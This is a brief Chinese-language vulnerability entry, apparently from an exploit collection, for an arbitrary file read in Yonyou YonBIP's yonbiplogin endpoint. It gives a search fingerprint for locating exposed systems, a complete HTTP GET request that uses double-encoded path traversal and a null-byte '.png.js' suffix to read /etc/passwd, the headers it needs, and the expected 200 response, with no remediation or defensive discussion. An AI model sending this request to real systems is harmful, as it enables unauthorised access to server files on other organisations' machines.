# 用友YonBIP高级版yonbiplogin任意文件读取漏洞

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="数字化工作台"`
- **请求**：`GET /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js HTTP/2`
- **关键头**：`Sec-Fetch-User: ?1`　`Priority: u=0, i`
- **预期**：200　|　—